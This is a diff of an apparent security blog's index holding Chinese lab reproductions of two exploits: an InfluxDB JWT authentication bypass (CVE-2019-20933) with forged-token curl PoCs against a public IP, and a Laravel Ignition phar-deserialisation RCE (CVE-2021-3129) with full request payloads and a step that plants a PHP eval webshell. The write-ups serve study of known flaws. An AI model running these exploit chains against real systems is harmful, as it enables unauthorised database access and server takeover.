+<p><img src="/images/image-20230913195139890.png" alt="image-20230913195139890"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1063,8 +1074,9 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>InfluxDB JWT 认证绕过漏洞（CVE-2019-20933）</title>
     <url>/2022/11/10/InfluxDB%20JWT%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-20933%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="InfluxDB-JWT-认证绕过漏洞（CVE-2019-20933）"><a href="#InfluxDB-JWT-认证绕过漏洞（CVE-2019-20933）" class="headerlink" title="InfluxDB JWT 认证绕过漏洞（CVE-2019-20933）"></a>InfluxDB JWT 认证绕过漏洞（CVE-2019-20933）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>InfluxDB是一款著名的时序数据库，其使用jwt作为鉴权方式。</p>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>InfluxDB是一款著名的时序数据库，其使用jwt作为鉴权方式。</p>
 <p><strong>在其1.7.6版本以前</strong>，默认设置jwt的认证密钥<code>shared-secret</code>为空字符串，导致攻击者可以伪造任意用户身份在InfluxDB中执行SQL语句。</p>
+<a id="more"></a>
 <blockquote>
 <p>InfluxDB是一种高性能、分布式的时序数据库，旨在处理大量的时间序列数据，并支持快速查询和高效存储。它支持SQL类似的查询语言，使用户可以轻松地进行实时分析和基于时间序列的数据可视化。</p>
 <p>以下是 InfluxDB 的主要特点：</p>
@@ -1088,34 +1100,34 @@ for i in range(0,30):#密码猜测
 <h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动InfluxDB 1.6.6：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/influxdb/CVE-2019-20933/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
 <p>环境启动后，访问<code>http://your-ip:8086/debug/vars</code>即可查看一些服务信息，但此时执行SQL语句则会出现401错误：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910154220469.png" alt="image-20230910154220469"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910162422082.png" alt="image-20230910162422082" style="zoom:80%;"></p>
+<p><img src="/images/image-20230910154220469.png" alt="image-20230910154220469"></p>
+<p><img src="/images/image-20230910162422082.png" alt="image-20230910162422082" style="zoom:80%;"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>信息搜集</strong></p>
 <p>先确定版本号是否存在漏洞，版本 &lt; 1.7.6，是存在认证绕过漏洞的版本：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910162633445.png" alt="image-20230910162633445"></p>
+<p><img src="/images/image-20230910162633445.png" alt="image-20230910162633445"></p>
 <p>判断Influxdb服务绑定的端口号以及是否在公网进行监听：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -pantu</span><br><span class="line">netstat -pantu | grep influx</span><br></pre></td></tr></table></figure>
 <p>默认情况下，Influxdb服务是绑定在8086端口上供其他进程访问的。如果是监听在公网上，则存在未授权访问漏洞，漏洞危害达到最大化。</p>
 <p><strong>漏洞利用</strong></p>
 <p>输入如下命令进行用户名发现：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -G &apos;http://123.56.181.14:8086/debug/requests&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910164737834.png" alt="image-20230910164737834"></p>
+<p><img src="/images/image-20230910164737834.png" alt="image-20230910164737834"></p>
 <p>可以看到并没有返回数据库相关的用户名。</p>
 <p>InfluxDB具有Web管理界面，其存在一个默认的admin用户名，利用该用户名生成JSON Web Token后即可绕过认证，获得完整的用户权限，可以任意执行增删改等数据库操作。</p>
 <p>我们借助<a href="https://jwt.io/来生成jwt" target="_blank" rel="noopener">https://jwt.io/来生成jwt</a> token：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;exp&quot;: 1676346267</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>其中，<code>admin</code>是一个已经存在的用户，<code>exp</code>是一个时间戳，代表着这个token的过期时间，需要设置为一个未来的时间戳。</p>
 <p>最终生成的token：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910163906331.png" alt="image-20230910163906331"></p>
+<p><img src="/images/image-20230910163906331.png" alt="image-20230910163906331"></p>
 <p>发送带有这个jwt token的数据包，可见SQL语句执行成功：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910164310613.png" alt="image-20230910164310613"></p>
+<p><img src="/images/image-20230910164310613.png" alt="image-20230910164310613"></p>
 <p>POC如下：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -G -X POST &apos;http://123.56.181.14:8086/query&apos; --data-urlencode &apos;q=show users&apos; -H &apos;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k&apos;</span><br></pre></td></tr></table></figure>
 <p>利用效果如图，成功查询得到用户信息：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910165023287.png" alt="image-20230910165023287"></p>
+<p><img src="/images/image-20230910165023287.png" alt="image-20230910165023287"></p>
 <p>修改下PoC的利用方式，添加新的数据库：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -G -X POST &apos;http://123.56.181.14:8086/query&apos; --data-urlencode &apos;q=create database hacked&apos; -H &apos;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjk0MzM2NjYwfQ.ppl2b6_ddlOMionww8zs5x29EB2d2khQgNP1wWVQg6s&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910165748830.png" alt="image-20230910165748830"></p>
+<p><img src="/images/image-20230910165748830.png" alt="image-20230910165748830"></p>
 <p>远程利用也是一样的，直接往目标服务端的Influxdb接口发送PoC即可成功利用</p>
 ]]></content>
       <categories>
@@ -1128,10 +1140,11 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）</title>
     <url>/2023/01/17/Laravel%20Ignition%202.5.1%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-3129%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="Laravel-Ignition-2-5-1-代码执行漏洞（CVE-2021-3129）"><a href="#Laravel-Ignition-2-5-1-代码执行漏洞（CVE-2021-3129）" class="headerlink" title="Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）"></a>Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Laravel是一个由Taylor Otwell所创建，免费的开源 PHP Web 框架。</p>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Laravel是一个由Taylor Otwell所创建，免费的开源 PHP Web 框架。</p>
 <blockquote>
 <p>Laravel Ignition 是一个强大的错误和异常处理工具，它能够提供更好的错误诊断和调试体验，为 Laravel 的错误页面提供了更友好和可读性更强的设计</p>
 </blockquote>
+<a id="more"></a>
 <p>在开发模式下，Laravel使用了Ignition提供的错误页面，在Ignition 2.5.1及之前的版本中，有类似这样的代码：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$contents = file_get_contents($parameters[&apos;viewFile&apos;]);   #序列化</span><br><span class="line">file_put_contents($parameters[&apos;viewFile&apos;], $contents);    #反序列化</span><br></pre></td></tr></table></figure>
 <p>Laravel &lt;= 8.4.2 存在远程代码执行漏洞，当Laravel开启了Debug模式时，由于Laravel自带的2.5.2之前的Ignition功能的某些接口和函数存在过滤不严，未经过身份验证的远程攻击者可以发起恶意请求，通过<strong>构造恶意Log文件等方式触发phar反序列化，从而造成远程代码执行</strong>，控制服务器。</p>
@@ -1146,51 +1159,51 @@ for i in range(0,30):#密码猜测
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个运行着Laravel 8.4.2和Ignition 2.5.1的应用：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
 <p>环境启动后，访问<code>http://your-ip:8080</code>即可查看Laravel默认的欢迎页面。</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910194259406.png" alt="image-20230910194259406"></p>
+<p><img src="/images/image-20230910194259406.png" alt="image-20230910194259406"></p>
 <p>点击<strong>Generate app key</strong>生成应用程序密钥<br>至此环境搭建完成</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>想要利用该漏洞需要有几个步骤：</p>
 <p>利用phpggc生成对应的phar文件→清空laravel.log → Log中增加前缀（填充字符，用于对齐），使得最终只出现一次 payload→将编码后的phar文件写入到log中→清除干扰字符→执行phar反序列化</p>
 <p><strong>验证漏洞是否存在</strong></p>
 <p>burpsuite抓取一个数据包，按照下图的形式修改并发送数据包</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910195124699.png" alt="image-20230910195124699"></p>
+<p><img src="/images/image-20230910195124699.png" alt="image-20230910195124699"></p>
 <p>页面出现了Ignition的报错，说明漏洞存在，且开启了debug模式。</p>
 <p><strong>Laravel Debug mode RCE漏洞利用</strong></p>
 <h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>一、利用phpggc生成对应的phar文件</p>
 <p>通过在laravel的依赖里面找一条能够rce的链，生成对应的phar文件，并将phar文件base64编码，再将该base64编码后的字符进行convert.quoted-printable-encode编码</p>
 <p>工具下载地址：git clone <a href="https://github.com/ambionics/phpggc.git" target="_blank" rel="noopener">https://github.com/ambionics/phpggc.git</a></p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">php -d <span class="string">"phar.readonly=0"</span> ./phpggc/phpggc Laravel/RCE5 <span class="string">"phpinfo();"</span> --phar phar -o php:<span class="comment">//output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"</span></span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910200353296.png" alt="image-20230910200353296"></p>
+<p><img src="/images/image-20230910200353296.png" alt="image-20230910200353296"></p>
 <p>得到的POC（编码后的）最后面再加一个a，否则最终laravel.log里面将生成两个POC，导致利用失败：</p>
 <p><img src="https://img-blog.csdnimg.cn/dd8b1da0ee1046fb8a9ddb7a00e1c9be.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaOmihuWwj-eZveW4vQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
 <p>二、清空laravel.log</p>
 <p>使用php://filter中的convert.base64-decode过滤器的特性，将log清空。</p>
 <p>发送如下数据包，将Laravel的原日志文件laravel.log清空：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 328</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910200633460.png" alt="image-20230910200633460"></p>
+<p><img src="/images/image-20230910200633460.png" alt="image-20230910200633460"></p>
 <p>三、发送如下数据包，给Log增加一次前缀</p>
 <blockquote>
 <p><strong>如果出现两次 payload 或者出现部分残留的base64编码允许的字符将影响后续的base64解码</strong>。 可以通过在前后通过加填充字符的方式来调整 payload 的第一个字符下标为奇数 or 偶数，从而影响 utf16-&gt;utf8 的解码，来使得最终只出现一次 payload</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910200805099.png" alt="image-20230910200805099"></p>
+<p><img src="/images/image-20230910200805099.png" alt="image-20230910200805099"></p>
 <p>四、将编码后的字符写入到log中</p>
 <p>将之前生成的编码后的POC作为viewFile的值，发送数据包</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 5058</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=2B=00=41=00=51=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=49=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4E=00=54=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=48=00=4B=00=77=00=2F=00=57=00=51=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=45=00=44=00=33=00=75=00=36=00=2F=00=44=00=48=00=65=00=41=00=44=00=33=00=72=00=78=00=79=00=57=00=47=00=6E=00=46=00=34=00=6E=00=58=00=49=00=75=00=49=00=6D=00=43=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910201007691.png" alt="image-20230910201007691"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910201656301.png" alt="image-20230910201656301"></p>
+<p><img src="/images/image-20230910201007691.png" alt="image-20230910201007691"></p>
+<p><img src="/images/image-20230910201656301.png" alt="image-20230910201656301"></p>
 <p>五、清空干扰字符只留下我们生成的payload</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910201424924.png" alt="image-20230910201424924"></p>
+<p><img src="/images/image-20230910201424924.png" alt="image-20230910201424924"></p>
 <p><strong>tips:</strong> 这一步可能会出现异常，导致无法正确清理Log文件。如果出现这种状况，可以重新从第一步开始尝试</p>
 <p>六、触发phar反序列化</p>
 <p>使用phar://进行反序列化，执行任意代码（<strong>此时需要使用绝对路径</strong>）：</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8080</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 210</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",</span></span><br><span class="line"><span class="comment">  "parameters": &#123;</span></span><br><span class="line"><span class="comment">    "variableName": "username",</span></span><br><span class="line"><span class="comment">    "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910202053862.png" alt="image-20230910202053862"></p>
+<p><img src="/images/image-20230910202053862.png" alt="image-20230910202053862"></p>
 <h4 id="蚁剑连接webshell"><a href="#蚁剑连接webshell" class="headerlink" title="蚁剑连接webshell"></a>蚁剑连接webshell</h4><p>我们可以利用该漏洞<strong>写入Webshell</strong>：</p>
 <p>1.利用phpggc生成对应的phar文件</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -d &quot;phar.readonly=0&quot; ./phpggc/phpggc Laravel/RCE5 &quot;system(&apos;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&apos;);&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&apos;&apos;.join([&apos;=&apos; + hex(ord(i))[2:] + &apos;=00&apos; for i in sys.stdin.read()]).upper())&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910202642109.png" alt="image-20230910202642109"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910203108274.png" alt="image-20230910203108274"></p>
+<p><img src="/images/image-20230910202642109.png" alt="image-20230910202642109"></p>
+<p><img src="/images/image-20230910203108274.png" alt="image-20230910203108274"></p>
 <p>重复上述利用步骤后，即可连接Webshell ！</p>
 <p>2.清除laravel.log</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1199,11 +1212,11 @@ for i in range(0,30):#密码猜测
 <p>5.清除干扰字符<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>6.执行反序列化<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;phar:///var/www/storage/logs/laravel.log/test.txt&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>发送完以上数据包后，蚁剑进行连接，成功连接</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910203844643.png" alt="image-20230910203844643"></p>
+<p><img src="/images/image-20230910203844643.png" alt="image-20230910203844643"></p>
 <h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这里也可直接使用工具生成webshell进行连接(这里使用的是哥斯拉)</p>
 <p>github地址：<a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP" target="_blank" rel="noopener">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p>
 <p><img src="https://img-blog.csdnimg.cn/4459b03ef53f41acab26d864a976a9ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaOmihuWwj-eZveW4vQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910204850323.png" alt="image-20230910204850323"></p>
